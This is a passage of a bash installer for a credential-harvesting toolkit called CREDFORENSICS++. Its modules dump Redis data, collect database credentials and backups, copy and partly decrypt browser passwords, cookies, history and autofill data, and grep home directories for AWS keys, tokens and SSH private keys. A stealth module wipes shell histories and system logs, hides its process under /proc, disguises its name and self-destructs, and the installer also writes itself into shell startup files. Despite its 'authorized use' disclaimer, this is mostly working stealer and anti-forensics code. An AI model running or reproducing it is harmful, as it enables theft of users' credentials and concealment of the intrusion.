        fi
        
        # Try Redis
        if command -v redis-cli &> /dev/null; then
            echo "[+] Attempting Redis dump"
            redis-cli INFO 2>/dev/null > "$DATA_DIR/redis_info.txt"
            redis-cli KEYS "*" 2>/dev/null > "$DATA_DIR/redis_keys.txt"
            
            # Dump all keys
            redis-cli KEYS "*" 2>/dev/null | \
                while read -r key; do
                    echo "[KEY: $key]" >> "$DATA_DIR/redis_dump.txt"
                    redis-cli GET "$key" 2>/dev/null >> "$DATA_DIR/redis_dump.txt"
                    echo >> "$DATA_DIR/redis_dump.txt"
                done
        fi
    }
    
    # Analyze database logs
    _analyze_db_logs() {
        echo -e "${CYAN}[+] Analyzing database logs${NC}"
        
        # Find database logs
        find /var/log -type f \( \
            -name "*mysql*" -o \
            -name "*mariadb*" -o \
            -name "*postgres*" -o \
            -name "*mongodb*" -o \
            -name "*redis*" \
            \) 2>/dev/null | \
            while read -r log; do
                echo "[+] Database log: $log"
                # Look for authentication attempts
                tail -100 "$log" 2>/dev/null | grep -i "auth\|login\|password\|fail" | \
                    head -20 > "$DATA_DIR/$(basename "$log").auth.txt"
            done
        
        # Check for slow query logs
        find /var/lib /var/log -name "*slow*" -type f 2>/dev/null | \
            while read -r log; do
                echo "[+] Slow query log: $log"
                tail -50 "$log" 2>/dev/null > "$DATA_DIR/$(basename "$log").slow.txt"
            done
    }
    
    # Check for database backups
    _find_db_backups() {
        echo -e "${CYAN}[+] Searching for database backups${NC}"
        
        find /home /opt /backup /var/backup /tmp -type f \( \
            -name "*.sql" -o \
            -name "*.dump" -o \
            -name "*.bak" -o \
            -name "*backup*" \
            \) -size -100M 2>/dev/null | \
            head -50 > "$DATA_DIR/db_backup_files.txt"
        
        # Check for automated backups
        crontab -l 2>/dev/null | grep -i "backup\|dump\|mysql\|pg_dump" || true
        find /etc/cron* -type f -exec grep -l "backup\|dump\|mysql\|pg_dump" {} \; 2>/dev/null
    }
    
    # Run all database analysis
    _discover_databases
    _extract_db_creds
    _dump_databases
    _analyze_db_logs
    _find_db_backups
}
EOF

    # Browser forensics module (advanced)
    cat << 'EOF' > "$INSTALL_DIR/modules/browser_advanced.sh"
#!/bin/bash
# Advanced Browser Forensics Module

module_browser_advanced() {
    echo -e "${PURPLE}[*] Advanced Browser Forensics${NC}"
    
    # Discover installed browsers
    _discover_browsers() {
        echo -e "${CYAN}[+] Discovering installed browsers${NC}"
        
        local browsers=()
        
        # Check common browser locations
        for browser in chrome chromium firefox brave opera edge vivaldi safari; do
            case "$browser" in
                chrome)
                    [ -d "$HOME/.config/google-chrome" ] && browsers+=("chrome")
                    ;;
                chromium)
                    [ -d "$HOME/.config/chromium" ] && browsers+=("chromium")
                    ;;
                firefox)
                    [ -d "$HOME/.mozilla/firefox" ] && browsers+=("firefox")
                    ;;
                brave)
                    [ -d "$HOME/.config/BraveSoftware" ] && browsers+=("brave")
                    ;;
                opera)
                    [ -d "$HOME/.config/opera" ] && browsers+=("opera")
                    ;;
                edge)
                    [ -d "$HOME/.config/microsoft-edge" ] && browsers+=("edge")
                    ;;
                safari)
                    [ -d "$HOME/Library/Safari" ] && browsers+=("safari")
                    ;;
            esac
        done
        
        echo "[+] Found browsers: ${browsers[*]}"
        printf '%s\n' "${browsers[@]}" > "$DATA_DIR/discovered_browsers.txt"
    }
    
    # Extract passwords from browsers
    _extract_browser_passwords() {
        local browser="$1"
        
        echo -e "${CYAN}[+] Extracting passwords from $browser${NC}"
        
        case "$browser" in
            chrome|chromium|brave|opera|edge|vivaldi)
                _extract_chrome_passwords "$browser"
                ;;
            firefox)
                _extract_firefox_passwords
                ;;
            safari)
                _extract_safari_passwords
                ;;
        esac
    }
    
    _extract_chrome_passwords() {
        local browser="$1"
        local profile_dir=""
        
        case "$browser" in
            chrome)      profile_dir="$HOME/.config/google-chrome" ;;
            chromium)    profile_dir="$HOME/.config/chromium" ;;
            brave)       profile_dir="$HOME/.config/BraveSoftware/Brave-Browser" ;;
            opera)       profile_dir="$HOME/.config/opera" ;;
            edge)        profile_dir="$HOME/.config/microsoft-edge" ;;
            vivaldi)     profile_dir="$HOME/.config/vivaldi" ;;
        esac
        
        [ ! -d "$profile_dir" ] && return
        
        # Find Login Data database
        find "$profile_dir" -name "Login Data" -o -name "Login Data-journal" | \
            while read -r db; do
                local profile_name=$(echo "$db" | awk -F'/' '{print $(NF-2)}')
                echo "[+] Found login database in profile: $profile_name"
                
                # Copy database
                cp "$db" "$DATA_DIR/${browser}_${profile_name}_logins.db" 2>/dev/null
                
                # Try to decrypt if possible
                _decrypt_chrome_passwords "$db" "$browser" "$profile_name"
            done
    }
    
    _decrypt_chrome_passwords() {
        local db="$1"
        local browser="$2"
        local profile="$3"
        
        # This is a simplified example
        # In reality, you would need to:
        # 1. Extract the encryption key from the system
        # 2. Use it to decrypt the passwords
        
        if command -v python3 &> /dev/null; then
            cat > "$DATA_DIR/${browser}_${profile}_decrypt.py" << 'PYEOF'
#!/usr/bin/env python3
import sqlite3, os, json, base64
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

# Simplified decryption example
def decrypt_chrome_password(encrypted_password, key):
    # Actual implementation would be more complex
    # This is just a placeholder
    try:
        # Remove the 'v10' or 'v11' prefix
        encrypted_password = encrypted_password[3:]
        iv = encrypted_password[:12]
        ciphertext = encrypted_password[12:-16]
        tag = encrypted_password[-16:]
        
        cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted.decode('utf-8')
    except:
        return "[ENCRYPTED]"

# Main extraction
db_path = os.environ.get('DB_PATH', '')
output_file = os.environ.get('OUTPUT_FILE', '')

if db_path and os.path.exists(db_path):
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    
    try:
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        results = cursor.fetchall()
        
        with open(output_file, 'w') as f:
            for url, username, password in results:
                f.write(f"URL: {url}\n")
                f.write(f"Username: {username}\n")
                f.write(f"Password: {password[:50]}...\n")
                f.write("-" * 50 + "\n")
    except:
        pass
    
    conn.close()
PYEOF
            
            export DB_PATH="$db"
            export OUTPUT_FILE="$DATA_DIR/${browser}_${profile}_passwords.txt"
            python3 "$DATA_DIR/${browser}_${profile}_decrypt.py" 2>/dev/null || true
            rm -f "$DATA_DIR/${browser}_${profile}_decrypt.py"
        fi
    }
    
    _extract_firefox_passwords() {
        local firefox_dir="$HOME/.mozilla/firefox"
        [ ! -d "$firefox_dir" ] && return
        
        # Find profiles
        find "$firefox_dir" -name "*.default*" -o -name "*.default-release*" | \
            while read -r profile; do
                local profile_name=$(basename "$profile")
                echo "[+] Firefox profile: $profile_name"
                
                # Look for signons.sqlite
                for db in "signons.sqlite" "logins.json" "key4.db"; do
                    [ -f "$profile/$db" ] && {
                        cp "$profile/$db" "$DATA_DIR/firefox_${profile_name}_${db}" 2>/dev/null
                        echo "[+] Copied: $db"
                    }
                done
            done
    }
    
    _extract_safari_passwords() {
        [ ! -d "$HOME/Library/Safari" ] && return
        
        # Safari stores passwords in Keychain
        # This is a simplified approach
        if [ "$(uname -s)" = "Darwin" ] && command -v security &> /dev/null; then
            echo "[+] Attempting to extract Safari passwords from Keychain"
            
            # List Safari items in keychain
            security find-internet-password -s safari 2>/dev/null | \
                head -50 > "$DATA_DIR/safari_keychain_items.txt"
        fi
        
        # Copy Safari databases
        cp "$HOME/Library/Safari/History.db" "$DATA_DIR/safari_history.db" 2>/dev/null
        cp "$HOME/Library/Safari/Bookmarks.plist" "$DATA_DIR/safari_bookmarks.plist" 2>/dev/null
    }
    
    # Extract cookies
    _extract_browser_cookies() {
        local browser="$1"
        local profile_dir=""
        
        case "$browser" in
            chrome)      profile_dir="$HOME/.config/google-chrome" ;;
            firefox)     profile_dir="$HOME/.mozilla/firefox" ;;
            brave)       profile_dir="$HOME/.config/BraveSoftware/Brave-Browser" ;;
        esac
        
        [ ! -d "$profile_dir" ] && return
        
        find "$profile_dir" -name "Cookies" -o -name "cookies.sqlite" | \
            while read -r cookie_db; do
                local profile_name=$(echo "$cookie_db" | awk -F'/' '{print $(NF-2)}')
                cp "$cookie_db" "$DATA_DIR/${browser}_${profile_name}_cookies.db" 2>/dev/null
                
                # Extract session cookies
                if command -v sqlite3 &> /dev/null; then
                    sqlite3 "$cookie_db" "SELECT host_key, name, value FROM cookies WHERE host_key LIKE '%session%';" \
                        2>/dev/null > "$DATA_DIR/${browser}_${profile_name}_session_cookies.txt"
                fi
            done
    }
    
    # Extract browsing history
    _extract_browser_history() {
        local browser="$1"
        
        echo -e "${CYAN}[+] Extracting $browser history${NC}"
        
        case "$browser" in
            chrome|chromium|brave)
                local profile_dir="$HOME/.config/google-chrome"
                [ "$browser" = "chromium" ] && profile_dir="$HOME/.config/chromium"
                [ "$browser" = "brave" ] && profile_dir="$HOME/.config/BraveSoftware/Brave-Browser"
                
                find "$profile_dir" -name "History" | \
                    while read -r history_db; do
                        local profile_name=$(echo "$history_db" | awk -F'/' '{print $(NF-2)}')
                        cp "$history_db" "$DATA_DIR/${browser}_${profile_name}_history.db" 2>/dev/null
                    done
                ;;
            firefox)
                find "$HOME/.mozilla/firefox" -name "places.sqlite" | \
                    while read -r history_db; do
                        local profile_name=$(basename $(dirname "$history_db"))
                        cp "$history_db" "$DATA_DIR/firefox_${profile_name}_history.db" 2>/dev/null
                    done
                ;;
        esac
    }
    
    # Extract autofill data
    _extract_autofill_data() {
        local browser="$1"
        
        echo -e "${CYAN}[+] Extracting $browser autofill data${NC}"
        
        case "$browser" in
            chrome|chromium|brave)
                local profile_dir="$HOME/.config/google-chrome"
                [ "$browser" = "chromium" ] && profile_dir="$HOME/.config/chromium"
                [ "$browser" = "brave" ] && profile_dir="$HOME/.config/BraveSoftware/Brave-Browser"
                
                find "$profile_dir" -name "Web Data" | \
                    while read -r web_data; do
                        local profile_name=$(echo "$web_data" | awk -F'/' '{print $(NF-2)}')
                        cp "$web_data" "$DATA_DIR/${browser}_${profile_name}_webdata.db" 2>/dev/null
                    done
                ;;
        esac
    }
    
    # Extract extensions and their permissions
    _extract_browser_extensions() {
        local browser="$1"
        
        echo -e "${CYAN}[+] Analyzing $browser extensions${NC}"
        
        case "$browser" in
            chrome|chromium|brave)
                local profile_dir="$HOME/.config/google-chrome"
                [ "$browser" = "chromium" ] && profile_dir="$HOME/.config/chromium"
                [ "$browser" = "brave" ] && profile_dir="$HOME/.config/BraveSoftware/Brave-Browser"
                
                find "$profile_dir" -path "*/Extensions/*/manifest.json" | \
                    while read -r manifest; do
                        local ext_id=$(echo "$manifest" | awk -F'/' '{print $(NF-2)}')
                        local profile_name=$(echo "$manifest" | awk -F'/' '{print $(NF-4)}')
                        
                        echo "[Extension: $ext_id]" >> "$DATA_DIR/${browser}_${profile_name}_extensions.txt"
                        grep -E "(name|description|permissions)" "$manifest" | \
                            head -10 >> "$DATA_DIR/${browser}_${profile_name}_extensions.txt"
                        echo >> "$DATA_DIR/${browser}_${profile_name}_extensions.txt"
                    done
                ;;
            firefox)
                find "$HOME/.mozilla/firefox" -name "extensions.json" | \
                    while read -r ext_file; do
                        local profile_name=$(basename $(dirname "$ext_file"))
                        cp "$ext_file" "$DATA_DIR/firefox_${profile_name}_extensions.json" 2>/dev/null
                    done
                ;;
        esac
    }
    
    # Run all browser analysis
    _discover_browsers
    
        while read -r browser; do
            [ -z "$browser" ] && continue
            echo -e "\n${GREEN}[*] Processing browser: $browser${NC}"
            _extract_browser_passwords "$browser"
            _extract_browser_cookies "$browser"
            _extract_browser_history "$browser"
            _extract_autofill_data "$browser"
            _extract_browser_extensions "$browser"
        done < "$DATA_DIR/discovered_browsers.txt"
}
EOF

    # Stealth and evasion module
    cat << 'EOF' > "$INSTALL_DIR/modules/stealth_advanced.sh"
#!/bin/bash
# Advanced Stealth and Evasion Module

module_stealth_advanced() {
    echo -e "${PURPLE}[*] Advanced Stealth and Evasion${NC}"
    
    # Anti-forensics techniques
    _anti_forensics() {
        echo -e "${CYAN}[+] Applying anti-forensics techniques${NC}"
        
        # Clear command history
        [ -f "$HOME/.bash_history" ] && {
            echo "[+] Clearing bash history"
            > "$HOME/.bash_history"
            history -c
            unset HISTFILE
        }
        
        # Clear other shell histories
        for shell in zsh fish ksh; do
            [ -f "$HOME/.${shell}_history" ] && > "$HOME/.${shell}_history"
        done
        
        # Clear system logs (requires root)
        if [ "$UID" -eq 0 ]; then
            echo "[+] Clearing system logs"
            find /var/log -type f -name "*.log" -exec sh -c '> {}' \; 2>/dev/null || true
        fi
        
        # Remove timestamps from files
        _remove_timestamps
    }
    
    _remove_timestamps() {
        echo -e "${CYAN}[+] Removing timestamps${NC}"
        
        # Set all timestamps to a fixed date
        local fixed_date="202001010000"
        
        # Important: Only modify our own files
        for file in "$INSTALL_DIR"/*.sh "$DATA_DIR"/*.txt; do
            [ -f "$file" ] && touch -t "$fixed_date" "$file" 2>/dev/null
        done
        
        # Change directory timestamps
        touch -t "$fixed_date" "$INSTALL_DIR" 2>/dev/null
        touch -t "$fixed_date" "$DATA_DIR" 2>/dev/null
    }
    
    # Process hiding techniques
    _hide_process() {
        local pid="${1:-$$}"
        
        echo -e "${CYAN}[+] Hiding process $pid${NC}"
        
        # Mount over /proc/pid (requires root)
        if [ "$UID" -eq 0 ]; then
            mount -n --bind /dev/shm "/proc/$pid" 2>/dev/null && {
                echo "[+] Process $pid is now hidden"
            }
        fi
        
        # Rename process command line
        if [ -f "/proc/$$/cmdline" ]; then
            printf "[kernel_task]" > "/proc/$$/cmdline" 2>/dev/null || true
        fi
    }
    
    # Network stealth
    _network_stealth() {
        echo -e "${CYAN}[+] Enabling network stealth${NC}"
        
        # Use existing connections
        _reuse_existing_connections
        
        # DNS tunneling avoidance
        _avoid_dns_monitoring
        
        # Traffic obfuscation
        _obfuscate_traffic
    }
    
    _reuse_existing_connections() {
        # Look for existing SSH connections
        if command -v ss &> /dev/null; then
            ss -t -a | grep -E "(ssh|22)" | head -5 | while read -r line; do
                echo "[+] Existing SSH connection: $line"
            done
        fi
        
        # Check for VPN connections
        if [ -d "/proc/sys/net/ipv4/conf/tun0" ]; then
            echo "[+] VPN tunnel detected: tun0"
        fi
    }
    
    _avoid_dns_monitoring() {
        # Use IP addresses instead of hostnames
        echo "[+] Using IP-based communications"
        
        # Hardcoded IPs for common services
        local ip_services=(
            "8.8.8.8:dns"
            "1.1.1.1:dns"
            "151.101.1.69:github"
        )
        
        # Add to /etc/hosts temporarily
        for service in "${ip_services[@]}"; do
            ip="${service%:*}"
            name="${service#*:}"
            echo "$ip $name" >> /etc/hosts 2>/dev/null || true
        done
    }
    
    _obfuscate_traffic() {
        # Simple traffic obfuscation techniques
        echo "[+] Obfuscating network traffic"
        
        # Add random delay between operations
        sleep $((RANDOM % 3))
        
        # Use common user-agent
        export USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        
        # Randomize request timing
        _randomized_request() {
            local url="$1"
            sleep $((RANDOM % 5))
            curl -s -A "$USER_AGENT" "$url" 2>/dev/null || true
        }
    }
    
    # Memory-only execution
    _memory_only_execution() {
        echo -e "${CYAN}[+] Setting up memory-only execution${NC}"
        
        # Create ramdisk for temporary files
        if [ "$UID" -eq 0 ]; then
            mount -t tmpfs -o size=100M tmpfs /tmp/memory_only 2>/dev/null && {
                export TMPDIR="/tmp/memory_only"
                echo "[+] Using memory-only temporary directory"
            }
        fi
        
        # Run script from memory
        if [ -f "$0" ]; then
            local script_content=$(cat "$0")
            echo "[+] Script loaded into memory"
            
            # Execute from memory
            eval "$script_content" 2>/dev/null || true
        fi
    }
    
    # Cleanup and exit
    _clean_exit() {
        echo -e "${CYAN}[+] Performing cleanup${NC}"
        
        # Remove all created files
        rm -rf "$DATA_DIR"/* 2>/dev/null || true
        
        # Clear cache
        > "$CACHE_DIR"/* 2>/dev/null || true
        
        # Remove installation if requested
        if [ "${CF_SELF_DESTRUCT:-false}" = "true" ]; then
            echo "[+] Self-destructing"
            rm -rf "$INSTALL_DIR" 2>/dev/null
            rm -f "$BIN_DIR/$TOOL_NAME" 2>/dev/null
        fi
        
        # Kill background processes
        jobs -p | xargs kill -9 2>/dev/null || true
        
        # Final message
        echo -e "${GREEN}[+] Cleanup complete${NC}"
    }
    
    # Run stealth techniques
    _anti_forensics
    _hide_process "$$"
    _network_stealth
    _memory_only_execution
    
    # Setup cleanup on exit
    trap _clean_exit EXIT
}
EOF

    chmod +x "$INSTALL_DIR/modules"/*.sh
}

# Install main script
install_main_script() {
    cat << 'EOF' > "$INSTALL_DIR/cfplus.sh"
#!/bin/bash
# CREDFORENSICS++ Main Script

set -euo pipefail

# Source configuration
CF_CONFIG="${CF_CONFIG:-$HOME/.credforensics-plus/config.cfg}"
[ -f "$CF_CONFIG" ] && source "$CF_CONFIG"

# Default settings
: ${CF_DEBUG:=false}
: ${CF_STEALTH:=false}
: ${CF_OUTPUT_DIR:="$HOME/.cfplus_output"}
: ${CF_LOG_FILE:="/dev/null"}
: ${CF_CACHE_KEY:="default_cache_key_$(hostname)"}

# Import core functions
source "$INSTALL_DIR/core_functions.sh"

# Show usage
usage() {
    cat << "EOF"
CREDFORENSICS++ - Advanced Credential Forensics Toolkit

Usage:
  cfplus [OPTIONS] [COMMAND]

Options:
  --quick             Quick credential scan
  --deep              Deep forensic analysis
  --stealth           Enable stealth mode
  --module <module>   Run specific module
  --output <dir>      Output directory
  --report            Generate HTML report
  --cleanup           Remove all traces
  --help              Show this help

Modules:
  memory      - Memory forensics
  browser     - Browser credential extraction
  cloud       - Cloud credential discovery
  network     - Network traffic analysis
  database    - Database credential extraction
  stealth     - Anti-forensics techniques
  all         - Run all modules

Examples:
  cfplus --quick
  cfplus --module memory
  cfplus --deep --stealth
  cfplus --module all --output /tmp/report
EOF
}

# Parse arguments
parse_args() {
    while [[ $# -gt 0 ]]; do
        case $1 in
            --quick)
                MODE="quick"
                shift
                ;;
            --deep)
                MODE="deep"
                shift
                ;;
            --stealth)
                CF_STEALTH=true
                shift
                ;;
            --module)
                MODULE="$2"
                shift 2
                ;;
            --output)
                CF_OUTPUT_DIR="$2"
                shift 2
                ;;
            --report)
                GENERATE_REPORT=true
                shift
                ;;
            --cleanup)
                CLEANUP=true
                shift
                ;;
            --help|-h)
                usage
                exit 0
                ;;
            *)
                echo "Unknown option: $1"
                usage
                exit 1
                ;;
        esac
    done
}

# Quick scan
quick_scan() {
    echo -e "${GREEN}[*] Starting quick credential scan${NC}"
    
    # Check for common credential locations
    local checks=(
        "AWS credentials"          "grep -r 'AKIA' $HOME 2>/dev/null | head -5"
        "API keys"                 "grep -r 'sk_' $HOME 2>/dev/null | head -5"
        "Environment variables"    "env | grep -E '(KEY|TOKEN|SECRET|PASS)'"
        "SSH keys"                 "find $HOME/.ssh -name 'id_*' ! -name '*.pub' 2>/dev/null"
        "Docker credentials"       "cat $HOME/.docker/config.json 2>/dev/null | grep auth"
        "Kubernetes config"        "ls -la $HOME/.kube/config 2>/dev/null"
    )
    
    for ((i=0; i<${#checks[@]}; i+=2)); do
        echo -e "\n${CYAN}[+] ${checks[i]}${NC}"
        eval "${checks[i+1]}" || true
    done
    
    echo -e "\n${GREEN}[*] Quick scan complete${NC}"
}

# Deep forensic analysis
deep_analysis() {
    echo -e "${GREEN}[*] Starting deep forensic analysis${NC}"
    
    # Create output directory
    mkdir -p "$CF_OUTPUT_DIR"
    
    # Run all modules
    for module in memory browser cloud network database; do
        if [ -f "$INSTALL_DIR/modules/${module}_advanced.sh" ]; then
            echo -e "\n${PURPLE}[*] Running module: $module${NC}"
            source "$INSTALL_DIR/modules/${module}_advanced.sh"
            "module_${module}_advanced"
        fi
    done
    
    # Run stealth module if requested
    if [ "$CF_STEALTH" = "true" ]; then
        echo -e "\n${PURPLE}[*] Running stealth module${NC}"
        source "$INSTALL_DIR/modules/stealth_advanced.sh"
        module_stealth_advanced
    fi
    
    echo -e "\n${GREEN}[*] Deep analysis complete${NC}"
    echo -e "${CYAN}[*] Results saved to: $CF_OUTPUT_DIR${NC}"
}

# Generate report
generate_report() {
    local report_file="$CF_OUTPUT_DIR/report_$(date +%Y%m%d_%H%M%S).html"
    
    cat > "$report_file" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>CREDFORENSICS++ Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        h1 { color: #333; }
        .section { margin: 20px 0; padding: 15px; border: 1px solid #ddd; }
        .credential { background: #ffe6e6; padding: 10px; margin: 5px; }
        .summary { background: #e6f7ff; padding: 15px; }
        pre { background: #f5f5f5; padding: 10px; overflow: auto; }
    </style>
</head>
<body>
    <h1>CREDFORENSICS++ Forensic Report</h1>
    <div class="summary">
        <h2>Summary</h2>
        <p>Generated: $(date)</p>
        <p>Hostname: $(hostname)</p>
        <p>User: $(whoami)</p>
    </div>
EOF
    
    # Add findings
    for file in "$CF_OUTPUT_DIR"/*.txt "$CF_OUTPUT_DIR"/*.json; do
        [ -f "$file" ] && {
            local filename=$(basename "$file")
            cat >> "$report_file" << EOF
    <div class="section">
        <h3>${filename}</h3>
        <pre>$(head -100 "$file" 2>/dev/null | sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g')</pre>
    </div>
EOF
        }
    done
    
    cat >> "$report_file" << EOF
</body>
</html>
EOF
    
    echo -e "${GREEN}[*] Report generated: $report_file${NC}"
}

# Cleanup
cleanup() {
    echo -e "${YELLOW}[*] Cleaning up...${NC}"
    
    # Remove output directory
    rm -rf "$CF_OUTPUT_DIR" 2>/dev/null || true
    
    # Clear cache
    rm -rf "$CACHE_DIR"/* 2>/dev/null || true
    
    # Remove log files
    > "$CF_LOG_FILE" 2>/dev/null || true
    
    echo -e "${GREEN}[*] Cleanup complete${NC}"
}

# Main function
main() {
    # Parse arguments
    parse_args "$@"
    
    # Set defaults
    : ${MODE:="quick"}
    : ${MODULE:=""}
    : ${GENERATE_REPORT:=false}
    : ${CLEANUP:=false}
    
    # Show banner
    show_banner
    
    # Run requested mode
    case "$MODE" in
        "quick")
            quick_scan
            ;;
        "deep")
            deep_analysis
            ;;
    esac
    
    # Run specific module if requested
    if [ -n "$MODULE" ]; then
        case "$MODULE" in
            "all")
                deep_analysis
                ;;
            *)
                if [ -f "$INSTALL_DIR/modules/${MODULE}_advanced.sh" ]; then
                    source "$INSTALL_DIR/modules/${MODULE}_advanced.sh"
                    "module_${MODULE}_advanced"
                else
                    echo -e "${RED}[!] Module not found: $MODULE${NC}"
                fi
                ;;
        esac
    fi
    
    # Generate report if requested
    if [ "$GENERATE_REPORT" = "true" ]; then
        generate_report
    fi
    
    # Cleanup if requested
    if [ "$CLEANUP" = "true" ]; then
        cleanup
    fi
    
    echo -e "\n${GREEN}[*] CREDFORENSICS++ complete${NC}"
}

# Run main function
main "$@"
EOF
    
    chmod +x "$INSTALL_DIR/cfplus.sh"
}

# Install shell integration
install_shell_integration_plus() {
    cat << 'EOF' > "$INSTALL_DIR/shell_integration.sh"
# CREDFORENSICS++ Shell Integration

# Aliases
alias cfplus='credforensics-plus'
alias cfscan='cfplus --quick'
alias cfdeep='cfplus --deep'
alias cfmem='cfplus --module memory'
alias cfbrowser='cfplus --module browser'
alias cfcloud='cfplus --module cloud'
alias cfnet='cfplus --module network'
alias cfdb='cfplus --module database'
alias cfstealth='cfplus --module stealth'
alias cfall='cfplus --module all'
alias cfreport='cfplus --report'
alias cfclean='cfplus --cleanup'

# Quick functions
cfquick() {
    cfplus --quick --output "/tmp/cf_$(date +%s)"
}

cfstealthscan() {
    cfplus --quick --stealth --output "/dev/shm/.cf_$(date +%s)"
}

cfmemdump() {
    local pid=${1:-$(pgrep -f "bash|sh|zsh" | head -1)}
    cfplus --module memory --output "/tmp/memdump_${pid}_$(date +%s)"
}

# Auto-completion
_cfplus_completion() {
    local cur prev words cword
    _init_completion || return
    
    local opts="--quick --deep --stealth --module --output --report --cleanup --help"
    local modules="memory browser cloud network database stealth all"
    
    case "$prev" in
        --module)
            COMPREPLY=($(compgen -W "$modules" -- "$cur"))
            return
            ;;
        --output)
            COMPREPLY=($(compgen -d -- "$cur"))
            return
            ;;
    esac
    
    if [[ $cur == -* ]]; then
        COMPREPLY=($(compgen -W "$opts" -- "$cur"))
    fi
}

complete -F _cfplus_completion cfplus credforensics-plus

# Environment setup
export CF_PLUS_HOME="$HOME/.credforensics-plus"
export PATH="$PATH:$HOME/.local/bin"

# Function to update
cfupdate() {
    echo "Updating CREDFORENSICS++..."
    curl -sSL https://raw.githubusercontent.com/YOUR_USERNAME/credforensics-plus/main/install.sh | bash
}

# Function to uninstall
cfuninstall() {
    echo "Uninstalling CREDFORENSICS++..."
    rm -rf "$HOME/.credforensics-plus"
    rm -f "$HOME/.local/bin/cfplus"
    sed -i '/CREDFORENSICS++/d' "$HOME/.bashrc" 2>/dev/null
    sed -i '/CREDFORENSICS++/d' "$HOME/.zshrc" 2>/dev/null
    echo "Uninstall complete."
}
EOF
}

# Show enhanced banner
show_banner_plus() {
    cat << "EOF"
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║    ╔═╗┬─┐┌─┐┌┬┐┌─┐┬─┐┌─┐  ╔═╗┌─┐┌─┐┬ ┬┌─┐┌┐┌┌┬┐┌─┐┬─┐┌┬┐        ║
║    ╠╣ ├┬┘│ ││││├┤ ├┬┘├┤   ╠═╝├─┤│  ├─┤├┤ │││ │ ├┤ ├┬┘│││        ║
║    ╚  ┴└─└─┘┴ ┴└─┘┴└─└─┘  ╩  ┴ ┴└─┘┴ ┴└─┘┘└┘ ┴ └─┘┴└─┴ ┴        ║
║                                                                  ║
║          C R E D E N T I A L   F O R E N S I C S   + +           ║
║                                                                  ║
║           Advanced Memory, Network & Cloud Credential            ║
║                    Discovery and Analysis                        ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
                                                                   
           ⚠️  FOR AUTHORIZED SECURITY ASSESSMENTS ONLY ⚠️           
           Use responsibly and in compliance with all laws          
                                                                   
EOF
}

# Main installation
main() {
    show_banner_plus
    
    # Legal disclaimer
    echo -e "${RED}LEGAL NOTICE:${NC}"
    echo "This tool is for authorized security assessments, penetration testing,"
    echo "and incident response only. Unauthorized use may violate laws."
    echo -e "${YELLOW}By continuing, you confirm you have proper authorization.${NC}"
    echo
    
    read -p "Do you accept responsibility for proper use? (y/N): " confirm
    if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
        echo "Installation cancelled."
        exit 0
    fi
    
    # Check dependencies
    check_deps
    
    # Detect platform
    platform=$(detect_platform)
    arch=$(detect_arch)
    echo -e "${BLUE}Platform:${NC} $platform-$arch"
    
    # Install
    echo -e "\n${GREEN}[*] Installing CREDFORENSICS++${NC}"
    download_toolkit
    install_core_functions
    install_advanced_modules
    install_main_script
    install_shell_integration_plus
    
    # Add to shell
    echo -e "\n${YELLOW}[*] Configuring shell...${NC}"
    if [ -f "$HOME/.bashrc" ]; then
        echo "source $INSTALL_DIR/shell_integration.sh" >> "$HOME/.bashrc"
    fi
    if [ -f "$HOME/.zshrc" ]; then
        echo "source $INSTALL_DIR/shell_integration.sh" >> "$HOME/.zshrc"
    fi
    
    # Final message
    echo -e "\n${GREEN}[✓] Installation complete!${NC}"
    echo -e "${CYAN}────────────────────────────────────────────────────────────${NC}"
    echo -e "${BLUE}Usage Examples:${NC}"
    echo "  cfplus --quick                     # Quick credential scan"
    echo "  cfplus --deep --stealth            # Deep stealth analysis"
    echo "  cfplus --module memory             # Memory forensics"
    echo "  cfplus --module browser            # Browser credential extraction"
    echo "  cfplus --module cloud              # Cloud credential discovery"
    echo "  cfplus --module all --report       # Full analysis with report"
    echo
    echo -e "${BLUE}Quick Commands:${NC}"
    echo "  cfscan                             # Alias for quick scan"
    echo "  cfmem                              # Memory forensics"
    echo "  cfcloud                            # Cloud discovery"
    echo "  cfstealth                          # Stealth mode"
    echo "  cfupdate                           # Update toolkit"
    echo
    echo -e "${BLUE}Output Directory:${NC} $INSTALL_DIR/data"
    echo -e "${BLUE}Binary:${NC} $BIN_DIR/cfplus"
    echo -e "${BLUE}Documentation:${NC} $REPO_URL"
    echo -e "${CYAN}────────────────────────────────────────────────────────────${NC}"
    echo -e "${YELLOW}⚠️  Remember: Use this tool only for authorized assessments${NC}"
    
    # Source for current shell
    if [ -f "$INSTALL_DIR/shell_integration.sh" ]; then
        source "$INSTALL_DIR/shell_integration.sh"
    fi
}

# Run installation
main "$@"
